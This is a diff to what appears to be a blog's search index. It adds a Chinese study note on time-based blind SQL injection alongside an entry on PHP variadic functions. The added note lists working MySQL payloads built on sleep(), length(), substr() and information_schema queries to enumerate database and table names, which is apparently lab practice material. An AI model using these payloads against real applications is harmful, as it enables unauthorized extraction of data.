@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[sql时间盲注]]></title>
+    <url>%2F2018%2F10%2F25%2Fsql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%2F</url>
+    <content type="text"><![CDATA[sql基于时间的盲注知识点1.时间检测盲注使用的函数 检测是否有时间盲注： and select sleep(5) --+ 2.检测数据库名and if(length(database())&gt;=8,sleep(5),1) --+ and (select if(ascii(substr(database(),1,1)),sleep(5),null)) --+ 3.检测表名检测表名长度 123and if(length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1)&gt;5),sleep(5),1)--+ 检测表名 12and if(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)=&apos;a&apos;,sleep(5),1)--+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>sql盲注</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[php可变个数参数的函数]]></title>
     <url>%2F2018%2F10%2F25%2Fphp%E5%8F%AF%E5%8F%98%E4%B8%AA%E6%95%B0%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%BD%E6%95%B0%2F</url>
     <content type="text"><![CDATA[php可变个数参数的函数php获取可变函数参数的函数php取得可变函数参数，方便后面的控制。 func_num_args()返回传递给该函数参数的个数 func_get_arg($arg_num)取得指定位置的参数值，$arg_num位置index从0开始到n-1。 fun_get_args()返回包含所有参数的数组]]></content>
